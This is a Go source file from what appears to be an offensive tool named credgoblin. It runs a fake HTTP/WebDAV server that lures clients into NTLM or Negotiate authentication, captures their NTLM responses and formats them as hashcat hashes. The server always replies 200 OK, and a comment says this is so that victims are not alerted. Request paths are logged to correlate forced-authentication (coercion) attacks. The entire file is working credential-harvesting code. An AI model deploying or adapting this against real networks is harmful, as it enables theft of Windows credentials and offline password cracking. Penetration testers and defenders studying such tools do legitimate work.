package smb

import (
	"context"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"strings"
	"time"

	"github.com/ineffectivecoder/credgoblin/pkg/ntlm"
	"github.com/ineffectivecoder/credgoblin/pkg/output"
)

// HTTPHandler handles HTTP NTLM authentication
type HTTPHandler struct {
	conn           net.Conn
	config         *Config
	logger         *output.Logger
	challengeGen   *ntlm.Challenge
	authParser     *ntlm.AuthMessageParser
	hashFormatter  *ntlm.HashcatFormatter
	challenge      *ntlm.ChallengeMessage
	onHashCaptured func(hash string, requestPath string)
	useNegotiate   bool   // Track if client is using Negotiate (SPNEGO) vs plain NTLM
	requestPath    string // Track the requested URL path for coercion correlation
}

// NewHTTPHandler creates a new HTTP handler
func NewHTTPHandler(conn net.Conn, config *Config, logger *output.Logger,
	challengeGen *ntlm.Challenge, authParser *ntlm.AuthMessageParser,
	hashFormatter *ntlm.HashcatFormatter) *HTTPHandler {
	return &HTTPHandler{
		conn:          conn,
		config:        config,
		logger:        logger,
		challengeGen:  challengeGen,
		authParser:    authParser,
		hashFormatter: hashFormatter,
	}
}

// OnHashCaptured sets callback for when a hash is captured
func (h *HTTPHandler) OnHashCaptured(callback func(hash string, requestPath string)) {
	h.onHashCaptured = callback
}

// Handle processes HTTP NTLM authentication
func (h *HTTPHandler) Handle(ctx context.Context) error {
	buf := make([]byte, 8192)

	// Loop to handle multiple requests on the same connection
	for {
		// Set read deadline
		h.conn.SetReadDeadline(time.Now().Add(30 * time.Second))

		// Read HTTP request
		n, err := h.conn.Read(buf)
		if err != nil {
			if err == io.EOF {
				return nil
			}
			return fmt.Errorf("failed to read HTTP request: %w", err)
		}

		request := string(buf[:n])
		h.logger.Debug(fmt.Sprintf("Received HTTP request (%d bytes)", n))

		// Log first few lines of request for debugging
		if h.config.Verbose {
			lines := splitHTTPLines(request)
			previewLines := 5
			if len(lines) < previewLines {
				previewLines = len(lines)
			}
			h.logger.Debug(fmt.Sprintf("Request preview (first %d lines):", previewLines))
			for i := 0; i < previewLines; i++ {
				h.logger.Debug(fmt.Sprintf("  %s", lines[i]))
			}
		}

		// Parse request method and Authorization header
		var authHeader string
		var method string
		lines := splitHTTPLines(request)
		if len(lines) > 0 {
			parts := strings.Fields(lines[0])
			if len(parts) >= 2 {
				method = parts[0]
				h.requestPath = parts[1] // Capture URL path for coercion tracking
			}
		}

		for _, line := range lines {
			if len(line) > 15 && (line[:15] == "Authorization: " || line[:15] == "authorization: ") {
				authHeader = line[15:]
				break
			}
		}

		// Handle WebDAV OPTIONS request without auth
		if method == "OPTIONS" && authHeader == "" {
			h.logger.Debug("WebDAV OPTIONS request, sending 401 with WebDAV headers")
			response := "HTTP/1.1 401 Unauthorized\r\n" +
				"WWW-Authenticate: NTLM\r\n" +
				"WWW-Authenticate: Negotiate\r\n" +
				"MS-Author-Via: DAV\r\n" +
				"DAV: 1, 2\r\n" +
				"Allow: OPTIONS, GET, HEAD, POST, PUT, DELETE, TRACE, PROPFIND, PROPPATCH, MKCOL, COPY, MOVE, LOCK, UNLOCK\r\n" +
				"Content-Length: 0\r\n" +
				"Connection: keep-alive\r\n" +
				"\r\n"
			_, err := h.conn.Write([]byte(response))
			if err != nil {
				return fmt.Errorf("failed to send 401: %w", err)
			}
			// Continue loop to read next request
			continue
		}

		// Log what we received for debugging
		if h.config.Verbose {
			h.logger.Debug(fmt.Sprintf("Authorization header: %q", authHeader))
		}

		// Handle NTLM authentication
		if len(authHeader) > 5 && authHeader[:5] == "NTLM " {
			h.useNegotiate = false
			return h.handleNTLMAuth(authHeader[5:])
		}

		// Also check for Negotiate (SPNEGO-wrapped NTLM)
		if len(authHeader) > 10 && authHeader[:10] == "Negotiate " {
			h.logger.Debug("Received Negotiate authentication, attempting to unwrap NTLM")
			h.useNegotiate = true
			return h.handleNTLMAuth(authHeader[10:])
		}

		return fmt.Errorf("unsupported authentication method: %q", authHeader)
	}
}

// handleNTLMAuth handles NTLM authentication flow
func (h *HTTPHandler) handleNTLMAuth(ntlmBase64 string) error {
	// Decode NTLM message
	ntlmData, err := base64.StdEncoding.DecodeString(ntlmBase64)
	if err != nil {
		return fmt.Errorf("failed to decode NTLM message: %w", err)
	}

	if len(ntlmData) < 12 {
		return fmt.Errorf("NTLM message too short")
	}

	// Check if this is SPNEGO-wrapped (doesn't start with NTLMSSP)
	if string(ntlmData[0:8]) != "NTLMSSP\x00" {
		// Try to unwrap SPNEGO
		unwrapped, err := unwrapSPNEGO(ntlmData)
		if err != nil {
			return fmt.Errorf("failed to unwrap SPNEGO: %w", err)
		}
		ntlmData = unwrapped
	}

	// Check NTLMSSP signature again
	if string(ntlmData[0:8]) != "NTLMSSP\x00" {
		return fmt.Errorf("invalid NTLMSSP signature")
	}

	// Get message type
	msgType := binary.LittleEndian.Uint32(ntlmData[8:12])
	h.logger.Debug(fmt.Sprintf("Received NTLM Type %d (%d bytes)", msgType, len(ntlmData)))

	switch msgType {
	case 1:
		// Type 1 - Negotiate
		return h.handleNTLMType1()
	case 3:
		// Type 3 - Authenticate
		return h.handleNTLMType3(ntlmData)
	default:
		return fmt.Errorf("unexpected NTLM message type: %d", msgType)
	}
}

// handleNTLMType1 sends NTLM Type 2 challenge
func (h *HTTPHandler) handleNTLMType1() error {
	h.logger.Debug("Processing HTTP NTLM Type 1")

	// Generate challenge
	h.challenge = h.challengeGen.Generate()
	type2 := h.challenge.Bytes()

	h.logger.Debug(fmt.Sprintf("Generated NTLM Type 2 challenge (%d bytes)", len(type2)))

	// Wrap in SPNEGO if client used Negotiate
	var authScheme string
	var type2Base64 string

	if h.useNegotiate {
		// Wrap NTLM Type 2 in SPNEGO (false = not Type 1)
		spnegoWrapped := wrapNTLMInSPNEGO(type2, false)
		type2Base64 = base64.StdEncoding.EncodeToString(spnegoWrapped)
		authScheme = "Negotiate"
	} else {
		// Plain NTLM
		type2Base64 = base64.StdEncoding.EncodeToString(type2)
		authScheme = "NTLM"
	}

	// Send 401 with NTLM Type 2 challenge
	response := "HTTP/1.1 401 Unauthorized\r\n" +
		"WWW-Authenticate: " + authScheme + " " + type2Base64 + "\r\n" +
		"Content-Length: 0\r\n" +
		"Connection: keep-alive\r\n" +
		"\r\n"

	if _, err := h.conn.Write([]byte(response)); err != nil {
		return fmt.Errorf("failed to send NTLM Type 2: %w", err)
	}

	h.logger.Debug("Sent HTTP NTLM Type 2 challenge")

	// Read Type 3 request
	h.conn.SetReadDeadline(time.Now().Add(30 * time.Second))
	buf := make([]byte, 8192)
	n, err := h.conn.Read(buf)
	if err != nil {
		return fmt.Errorf("failed to read NTLM Type 3 request: %w", err)
	}

	request := string(buf[:n])

	// Parse Authorization header and update request path from Type 3 request
	var authHeader string
	lines := splitHTTPLines(request)
	if len(lines) > 0 {
		parts := strings.Fields(lines[0])
		if len(parts) >= 2 {
			h.requestPath = parts[1] // Update path from Type 3 request
		}
	}
	for _, line := range lines {
		if len(line) > 15 && (line[:15] == "Authorization: " || line[:15] == "authorization: ") {
			authHeader = line[15:]
			break
		}
	}

	if authHeader == "" {
		return fmt.Errorf("no Authorization header in Type 3 request")
	}

	// Check for both "NTLM " and "Negotiate " prefixes
	var ntlmData []byte
	if len(authHeader) > 10 && authHeader[:10] == "Negotiate " {
		// SPNEGO-wrapped Type 3
		spnegoData, err := base64.StdEncoding.DecodeString(authHeader[10:])
		if err != nil {
			return fmt.Errorf("failed to decode SPNEGO Type 3: %w", err)
		}
		h.logger.Debug(fmt.Sprintf("SPNEGO blob size: %d bytes", len(spnegoData)))

		// Unwrap SPNEGO to get NTLM
		ntlmData, err = unwrapSPNEGO(spnegoData)
		if err != nil {
			return fmt.Errorf("failed to unwrap SPNEGO Type 3: %w", err)
		}
		h.logger.Debug(fmt.Sprintf("Unwrapped NTLM size: %d bytes", len(ntlmData)))
	} else if len(authHeader) > 5 && authHeader[:5] == "NTLM " {
		// Plain NTLM Type 3
		var err error
		ntlmData, err = base64.StdEncoding.DecodeString(authHeader[5:])
		if err != nil {
			return fmt.Errorf("failed to decode NTLM Type 3: %w", err)
		}
	} else {
		return fmt.Errorf("unexpected auth header format in Type 3: %s", authHeader[:min(len(authHeader), 20)])
	}

	return h.handleNTLMType3(ntlmData)
}

// min returns the smaller of two integers
func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// handleNTLMType3 processes NTLM Type 3 and extracts hash
func (h *HTTPHandler) handleNTLMType3(type3 []byte) error {
	h.logger.Debug("Processing HTTP NTLM Type 3")

	// Parse Type 3
	authMsg, err := h.authParser.Parse(type3)
	if err != nil {
		// Send 401 on parse error
		response := "HTTP/1.1 401 Unauthorized\r\n" +
			"Content-Length: 0\r\n" +
			"Connection: close\r\n" +
			"\r\n"
		h.conn.Write([]byte(response))
		return fmt.Errorf("failed to parse NTLM Type 3: %w", err)
	}

	// Format hash
	var hash string
	if h.challenge != nil {
		hash = h.hashFormatter.FormatHashcatFromChallenge(h.challenge, authMsg)
	}

	// Send 200 OK (always succeed to not tip off the client)
	response := "HTTP/1.1 200 OK\r\n" +
		"Content-Type: text/html\r\n" +
		"Content-Length: 13\r\n" +
		"Connection: close\r\n" +
		"\r\n" +
		"<html></html>"
	h.conn.Write([]byte(response))

	// Call hash captured callback with request path for coercion correlation
	if h.onHashCaptured != nil {
		h.onHashCaptured(hash, h.requestPath)
	}

	return nil
}

// splitHTTPLines splits HTTP request into lines
func splitHTTPLines(request string) []string {
	var lines []string
	current := ""
	for i := 0; i < len(request); i++ {
		if request[i] == '\r' && i+1 < len(request) && request[i+1] == '\n' {
			lines = append(lines, current)
			current = ""
			i++ // Skip \n
		} else if request[i] == '\n' {
			lines = append(lines, current)
			current = ""
		} else {
			current += string(request[i])
		}
	}
	if current != "" {
		lines = append(lines, current)
	}
	return lines
}
